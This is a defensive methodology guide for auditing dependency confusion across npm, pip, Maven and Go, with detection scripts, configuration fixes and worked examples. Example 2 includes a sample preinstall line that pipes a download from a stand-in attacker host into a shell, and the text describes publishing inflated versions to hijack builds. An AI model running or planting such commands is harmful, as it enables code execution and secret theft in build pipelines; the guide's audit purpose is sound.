# Dependency Confusion and Namespace Attacks

Systematic methodology for detecting dependency confusion vulnerabilities where
internal/private package names can be claimed on public registries, allowing
attacker code injection into build pipelines. Covers npm, pip, Maven, Go modules,
and registry configuration mechanisms.

## Methodology

### Step 1: Identify All Internal/Private Package References

Extract every dependency name and determine which resolve to private registries.

```bash
# npm: find non-public resolved URLs in lockfile
cat package-lock.json | jq -r '.. | select(.resolved?) | .resolved' \
  | sort -u | grep -v "registry.npmjs.org"

# pip: find custom index-url configuration
grep -rn "index-url\|extra-index-url" \
  requirements*.txt pip.conf setup.cfg pyproject.toml 2>/dev/null

# Maven: find custom repository declarations
grep -rn "<repository>" pom.xml */pom.xml 2>/dev/null

# Go: check GOPRIVATE settings
grep -rn "GOPRIVATE\|GONOSUMCHECK" .env Makefile Dockerfile go.env 2>/dev/null
```

All package names resolving to a private source are dependency confusion candidates.

### Step 2: Check Public Registry Availability of Internal Names

Probe the public registry for each internal package name to see if it is claimable.

```python
import requests
def check_npm_public(name):
    r = requests.get(f"https://registry.npmjs.org/{name}")
    if r.status_code == 404: return False, None  # Claimable!
    return True, r.json().get("dist-tags", {}).get("latest")

def check_pypi_public(name):
    r = requests.get(f"https://pypi.org/pypi/{name}/json")
    if r.status_code == 404: return False, None
    return True, r.json()["info"]["version"]
```

If the name is unclaimed: VULNERABLE Critical. If claimed by a third party,
check whether the build system prefers the public version (Step 3).

### Step 3: Analyze Registry Priority and Configuration

The core issue: build tools checking public registries before or alongside private.

**npm:**
```ini
# VULNERABLE: npm falls back to public for packages not found internally
registry=https://npm.internal.company.com/

# SAFE: scoped packages with explicit registry binding
@company:registry=https://npm.internal.company.com/
```

**pip:**
```ini
# VULNERABLE: extra-index-url checks BOTH, picks highest version
[global]
extra-index-url = https://pypi.internal.company.com/simple/

# SAFER: index-url replaces default (still needs --require-hashes for full safety)
[global]
index-url = https://pypi.internal.company.com/simple/
```

**Maven:**
```xml
<!-- VULNERABLE: Maven Central is always implicit, higher version wins -->
<repositories>
  <repository>
    <id>internal</id>
    <url>https://nexus.company.com/maven-releases/</url>
  </repository>
</repositories>

<!-- SAFE: mirrorOf=* routes everything through Nexus -->
<mirrors>
  <mirror><mirrorOf>*</mirrorOf>
    <url>https://nexus.company.com/maven-public/</url>
  </mirror>
</mirrors>
```

**Go modules:**
```bash
# VULNERABLE: GOPRIVATE not set, fetched via public proxy
go get company.com/internal/pkg

# SAFE: bypasses public proxy for internal modules
GOPRIVATE=company.com/internal/*
```

### Step 4: Test Version Number Hijacking

An attacker publishes a higher version on the public registry. If the build
system picks the highest version from any source, the attack succeeds.

```python
def check_version_hijack(name, internal_ver, ecosystem):
    if ecosystem == "npm": exists, pub_ver = check_npm_public(name)
    elif ecosystem == "pypi": exists, pub_ver = check_pypi_public(name)
    else: return "UNKNOWN"
    if not exists: return "CLAIMABLE"
    from packaging.version import Version
    return "HIJACKABLE" if Version(pub_ver) > Version(internal_ver) else "SAFE"
```

This is the classic Birsan vector: publish `99999.0.0` on public PyPI and
pip's `--extra-index-url` picks it because it is the highest version.

### Step 5: Examine Build Pipeline and CI Configuration

```yaml
# VULNERABLE: GitHub Actions with extra-index-url
- run: pip install --extra-index-url https://pypi.internal.co/simple/ -r requirements.txt

# SAFE: index-url + hash verification
- run: pip install --index-url https://pypi.internal.co/simple/ --require-hashes -r requirements.txt
```

```dockerfile
# VULNERABLE: fallback to public on internal registry outage
RUN npm install --registry=https://npm.internal.co/

# SAFER: scoped + lockfile enforcement
COPY .npmrc package.json package-lock.json ./
RUN npm ci
```

Check for expired auth tokens in CI -- failed authentication may silently fall
back to the public registry.

### Step 6: Validate Namespace Reservation

Verify the organization has reserved its namespace on public registries defensively.

```bash
npm view @company/test 2>&1               # Check npm scope ownership
curl -s https://pypi.org/user/company/     # Check PyPI org registration
```

Register namespaces on public registries even if publishing only internally.

## Decision Tree

```
START: Internal/private dependency identified
  |
  +--[Public registry]-- Name claimable?
  |   | YES -> VULNERABLE Critical
  |   | NO  -> Same name, different owner?
  |             | YES -> Public ver > internal? -> VULNERABLE Critical
  |             |        Public ver <= internal? -> Check config
  |             | NO (org owns both) -> SAFE (namespace reserved)
  |
  +--[Registry config]-- Falls back to public?
  |   | YES -> VULNERABLE High
  |   | NO  -> HARDENED Medium
  |
  +--[Scoping]-- @scope (npm) / --index-url (pip) used?
  |   | NO  -> VULNERABLE High
  |   | YES -> SAFE
  |
  +--[CI pipeline]-- Auth token can expire/fail silently?
  |   | YES -> HARDENED Medium
  |   | NO  -> SAFE
  END
```

## Real-World Examples

### Example 1: pip extra-index-url Confusion (Classic Birsan Attack)

```
# requirements.txt
company-auth==1.2.3
company-logging==0.9.1
```
```ini
# pip.conf
[global]
extra-index-url = https://pypi.internal.company.com/simple/
```

**Why vulnerable:** `--extra-index-url` adds the internal registry alongside
public PyPI. pip picks the highest version from either. Attacker registers
`company-auth` v`99999.0.0` on public PyPI with a malicious `setup.py`.

**Impact:** RCE during `pip install`. Malicious `setup.py` runs as the build
process -- typically root in Docker or a CI service account with secrets access.

**Fix:** Use `--index-url` (not `--extra-index-url`). Add `--require-hashes`.
Register `company-auth` on public PyPI as a defensive placeholder.

### Example 2: npm Unscoped Internal Packages

```json
{ "dependencies": { "company-ui-kit": "^2.1.0", "company-config": "^1.0.0" } }
```
```ini
# .npmrc
registry=https://npm.internal.company.com/
```

**Why vulnerable:** Packages lack `@company/` scope. npm falls back to public
registry during internal outages or off-VPN development. Attacker registers
`company-ui-kit` on npmjs.com with `preinstall` script exfiltrating secrets.

**Impact:** RCE via install scripts before any application code evaluates.
```json
{ "scripts": { "preinstall": "curl https://evil.com/exfil | sh" } }
```

**Fix:** Scope all internal packages as `@company/*`. Bind scope to internal
registry: `@company:registry=https://npm.internal.company.com/`. Claim the
`@company` scope on public npm defensively.

### Example 3: Maven groupId Not Reserved on Maven Central

```xml
<dependency>
  <groupId>com.company.internal</groupId>
  <artifactId>auth-sdk</artifactId>
  <version>3.1.0</version>
</dependency>
```

**Why vulnerable:** `com.company.internal` groupId is not verified on Maven
Central. Maven always checks Central implicitly. Attacker publishes
`com.company.internal:auth-sdk:99.0.0` to Central.

**Impact:** Arbitrary code execution during build via malicious annotation
processors or build plugins in the attacker's artifact.

**Fix:** Set `mirrorOf=*` in settings.xml to route all resolution through
internal Nexus. Configure Nexus to block internal groupIds from upstream.
Claim the groupId on Maven Central via Sonatype OSSRH.

## Common False Positive Patterns

1. **Scoped packages correctly configured.** `@company/` scope registered on
   public npm with explicit registry binding. Verify scope ownership.

2. **Go modules with company-controlled domains.** If the company controls DNS
   for the import path domain and serves `go-import` meta tags, confusion is
   not possible. Only flag if GOPRIVATE is missing AND domain is uncontrolled.

3. **Pull-through proxy registries.** Nexus/Artifactory proxying public
   registries through a single URL eliminates the dual-source confusion vector.
   Verify proxy configuration before flagging.

4. **Lockfile with integrity hashes.** If `package-lock.json` pins with
   `resolved` URL to internal registry AND `integrity` hash, the attack
   requires lockfile tampering. Downgrade to HARDENED Medium.

5. **Monorepo workspace packages.** npm/yarn workspaces and Cargo workspaces
   resolve sibling members locally, not from any registry.

6. **Defensive placeholder packages.** Organizations registering internal
   names on public registries with dummy `0.0.1` versions. Verify ownership.

7. **Air-gapped builds.** No outbound internet in build pipeline prevents
   public confusion at build time. Developer workstations may still be
   vulnerable -- downgrade to HARDENED Low.
